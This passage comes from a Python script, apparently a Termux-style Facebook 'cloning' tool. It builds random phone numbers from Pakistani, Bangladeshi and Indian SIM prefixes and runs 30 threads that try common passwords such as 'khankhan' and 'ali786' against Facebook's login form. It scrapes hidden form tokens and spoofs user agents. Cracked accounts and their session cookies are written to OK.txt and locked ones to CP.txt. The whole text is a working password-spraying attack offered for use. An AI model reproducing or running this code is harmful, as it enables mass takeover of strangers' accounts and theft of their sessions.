    print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt') 
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main() 
      
 def pass3(): 
     os.system("clear") 
     print(logo) 
     clear() 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016') 
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305') 
     print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ') 
     print('\033[1;97m====================================================')  
     print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m") 
     print('\033[1;97m====================================================')  
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m') 
     os.system("clear") 
     print(logo) 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m')) 
     for nmbr in range(limit): 
         nmp = ''.join(random.choice(string.digits) for _ in range(7)) 
         user.append(nmp) 
     with ThreadPool(max_workers=30) as manshera:     
         clear() 
         tl = str(len(user)) 
         print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
         print('\033[1;97m====================================================')  
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX) 
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code) 
         print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ") 
         print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m3')  
         print('\033[1;97m====================================================')  
         print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED') 
         print('\033[1;97m====================================================')  
         for love in user: 
             uid = code+love 
             pwx = [love,'khankhan'] 
             manshera.submit(freeq,uid,pwx,tl) 
     print('') 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp))) 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt') 
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main() 
  
 def pass4(): 
     os.system("clear") 
     print(logo) 
     clear() 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016') 
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305') 
     print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ') 
     print('\033[1;97m====================================================')  
     print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m") 
     print('\033[1;97m====================================================')  
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m') 
     os.system("clear") 
     print(logo) 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m')) 
     for nmbr in range(limit): 
         nmp = ''.join(random.choice(string.digits) for _ in range(7)) 
         user.append(nmp) 
     with ThreadPool(max_workers=30) as manshera:     
         clear() 
         tl = str(len(user)) 
         print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
         print('\033[1;97m====================================================')  
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX) 
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code) 
         print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ") 
         print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m4')  
         print('\033[1;97m====================================================')  
         print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED') 
         print('\033[1;97m====================================================')  
         for love in user: 
             uid = code+love 
             pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122'] 
             manshera.submit(freeq,uid,pwx,tl) 
     print('') 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp))) 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt') 
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main() 
  
 def pass5(): 
     os.system("clear") 
     print(logo) 
     clear() 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016') 
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305') 
     print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ') 
     print('\033[1;97m====================================================')  
     print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m") 
     print('\033[1;97m====================================================')  
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m') 
     os.system("clear") 
     print(logo) 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m')) 
     for nmbr in range(limit): 
         nmp = ''.join(random.choice(string.digits) for _ in range(7)) 
         user.append(nmp) 
     with ThreadPool(max_workers=30) as manshera:     
         clear() 
         tl = str(len(user)) 
         print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
         print('\033[1;97m====================================================')  
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX) 
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code) 
         print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ") 
         print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m5')  
         print('\033[1;97m====================================================')  
         print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED') 
         print('\033[1;97m====================================================')  
         for love in user: 
             uid = code+love 
             pwx = ['khankhan','ali786','ali123','ali1122','aliali'] 
             manshera.submit(freeq,uid,pwx,tl) 
     print('') 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp))) 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt') 
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main() 
  
 def pass6(): 
     os.system("clear") 
     print(logo) 
     clear() 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m") 
     print('\033[1;97m====================================================')  
     print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016') 
     print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305') 
     print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ') 
     print('\033[1;97m====================================================')  
     print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m") 
     print('\033[1;97m====================================================')  
     code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m') 
     os.system("clear") 
     print(logo) 
     print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
     print('\033[1;97m====================================================')  
     print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m") 
     print('\033[1;97m====================================================')  
     limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m')) 
     for nmbr in range(limit): 
         nmp = ''.join(random.choice(string.digits) for _ in range(7)) 
         user.append(nmp) 
     with ThreadPool(max_workers=30) as manshera:     
         clear() 
         tl = str(len(user)) 
         print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ") 
         print('\033[1;97m====================================================')  
         print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX) 
         print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code) 
         print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ") 
         print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m6')  
         print('\033[1;97m====================================================')  
         print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED') 
         print('\033[1;97m====================================================')  
         for love in user: 
             uid = code+love 
             pwx = ['khankhan','malikmalik','malik123','malik12','malik786'] 
             manshera.submit(freeq,uid,pwx,tl) 
     print('') 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp))) 
     print('\033[1;97m====================================================')  
     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt') 
     input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main() 
  
 def freeq(uid,pwx,tl): 
     global loop 
     global ok 
     global cp 
     global ugen 
     try: 
         for ps in pwx: 
             bi = random.choice([A]) 
             session = requests.Session() 
             pro = random.choice(ugen) 
             free_fb = session.get('https://free.facebook.com').text 
             log_data = { 
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), 
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1), 
             "try_number":"0", 
             "unrecognized_tries":"0", 
             "email":uid, 
             "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc", 
             "flow":"login_no_pain", 
             "pass":ps, 
             "login":"Log In"} 
             header_freefb = {'authority':'www.facebook.com', 
             'method': 'GET', 
             'path':'https://www.facebook.com/?_rdc=1&_rdr', 
             'scheme': 'https', 
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
             'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9', 
             'cache-control': 'max-age=0', 
             'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"', 
             'sec-ch-ua-mobile': '?1', 
             'sec-ch-ua-platform': '"Windows"', 
             'sec-fetch-dest': 'document', 
             'sec-fetch-mode': 'navigate', 
             'sec-fetch-site': 'none', 
             'sec-fetch-user': '?1', 
             'referer':'https://www.facebook.com/', 
             'upgrade-insecure-requests': '1', 
             'user-agent': pro} 
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text 
             log_cookies=session.cookies.get_dict().keys() 
             if 'c_user' in log_cookies: 
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                 uid = coki[151:166] 
                 print(f'\r\33[1;97m[\033[1;96mSUCCESSFUL\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ')  
                 cek_apk(session,coki) 
                 open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n') 
                 ok.append(uid) 
             elif 'checkpoint' in log_cookies: 
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                     uid=coki[141:156] 
                     print(f'\r\33[1;97m[\033[1;91mCHECKPOINT\033[1;97m]\033[1;90m '+uid+' | '+ps+' ') 
                     open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n') 
                     cp.append(uid) 
                     break 
             else: 
                 continue 
         loop+=1 
         sys.stdout.write(f'\r\33[1;37m[CRACKING] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))),  
         sys.stdout.flush() 
     except: 
         pass 
 #---------------------[END MENU]---------------------# 
 if __name__ == '__main__': 
     main()